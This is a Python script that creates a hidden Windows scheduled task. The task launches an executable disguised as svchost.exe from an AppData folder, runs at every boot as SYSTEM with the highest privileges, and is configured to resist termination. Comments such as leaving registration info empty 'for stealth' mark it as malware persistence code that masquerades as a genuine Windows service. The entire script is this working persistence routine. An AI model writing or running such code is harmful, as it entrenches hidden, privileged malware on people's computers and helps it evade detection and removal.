import win32com.client

TASK_TRIGGER_BOOT = 8
TASK_ACTION_EXEC = 0
TASK_CREATE_OR_UPDATE = 6
TASK_LOGON_SERVICE_ACCOUNT = 5
TASK_RUNLEVEL_HIGHEST = 1

task_name = "Windows Service Host"
exe_path = r"C:\Users\acer\AppData\Roaming\Microsoft\MS32\svchost.exe"

service = win32com.client.Dispatch("Schedule.Service")
service.Connect()

rootFolder = service.GetFolder("\\")
taskDef = service.NewTask(0)

# Registration Info (can leave empty for stealth)
taskDef.RegistrationInfo.Description = ""
taskDef.RegistrationInfo.Author = ""

# Trigger: On Startup
trigger = taskDef.Triggers.Create(TASK_TRIGGER_BOOT)
trigger.Enabled = True

# Action: Run EXE
action = taskDef.Actions.Create(TASK_ACTION_EXEC)
action.Path = exe_path

# Settings
taskDef.Settings.Enabled = True
taskDef.Settings.Hidden = True
taskDef.Settings.DisallowStartIfOnBatteries = False
taskDef.Settings.StopIfGoingOnBatteries = False
taskDef.Settings.StartWhenAvailable = True
taskDef.Settings.RunOnlyIfIdle = False
taskDef.Settings.IdleSettings.StopOnIdleEnd = False
taskDef.Settings.IdleSettings.RestartOnIdle = False
taskDef.Settings.AllowHardTerminate = False

# Run as SYSTEM
taskDef.Principal.UserId = "SYSTEM"
taskDef.Principal.LogonType = TASK_LOGON_SERVICE_ACCOUNT
taskDef.Principal.RunLevel = TASK_RUNLEVEL_HIGHEST

# Register the task
rootFolder.RegisterTaskDefinition(
    task_name,
    taskDef,
    TASK_CREATE_OR_UPDATE,
    "",  # No user = SYSTEM
    "",  # No password
    TASK_LOGON_SERVICE_ACCOUNT
)

print(f"Task '{task_name}' created successfully.")
